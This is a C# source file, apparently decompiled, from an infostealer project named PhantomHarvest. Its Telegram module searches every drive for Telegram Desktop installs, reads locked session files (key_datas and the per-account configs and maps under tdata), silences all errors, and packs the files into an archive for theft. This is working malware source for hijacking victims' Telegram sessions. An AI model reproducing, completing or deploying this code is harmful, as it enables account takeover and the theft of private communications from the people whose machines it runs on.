using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Messengers
{
	// Token: 0x02000018 RID: 24
	internal class Telegram
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				// 使用PathDiscovery查找所有Telegram安装路径（支持多盘符）
				List<string> telegramPaths = PathDiscovery.FindTelegramPaths();
				
				for (int j = 0; j < telegramPaths.Count; j++)
				{
					string telegramPath = telegramPaths[j];
					
					foreach (string text2 in Telegram.sessionpaths)
					{
						string fullPath = Path.Combine(telegramPath, text2);
						if (File.Exists(fullPath))
						{
							byte[] fileBytes = LockedFile.ReadLockedFile(fullPath);
							if (fileBytes != null)
							{
								// 替换 tdata 为 tdata_j 以避免多实例冲突
								string zipEntryName = Telegram.MessengerName + "/" + text2.Replace("tdata", "tdata_" + j.ToString()).Replace("\\", "/");
								
								using (MemoryStream ms = new MemoryStream(fileBytes))
								{
									zip.AddStream(ArchiveManager.Compression.Deflate, zipEntryName, ms, DateTime.Now, "");
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		public static string MessengerName = "Telegram";

		public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");

		private static string[] sessionpaths = new string[]
		{
			"tdata\\key_datas",
			"tdata\\D877F783D5D3EF8Cs",
			"tdata\\D877F783D5D3EF8C\\configs",
			"tdata\\D877F783D5D3EF8C\\maps",
			"tdata\\A7FDF864FBC10B77s",
			"tdata\\A7FDF864FBC10B77\\configs",
			"tdata\\A7FDF864FBC10B77\\maps",
			"tdata\\F8806DD0C461824Fs",
			"tdata\\F8806DD0C461824F\\configs",
			"tdata\\F8806DD0C461824F\\maps",
			"tdata\\C2B05980D9127787s",
			"tdata\\C2B05980D9127787\\configs",
			"tdata\\C2B05980D9127787\\maps",
			"tdata\\0CA814316818D8F6s",
			"tdata\\0CA814316818D8F6\\configs",
			"tdata\\0CA814316818D8F6\\maps"
		};
	}
}
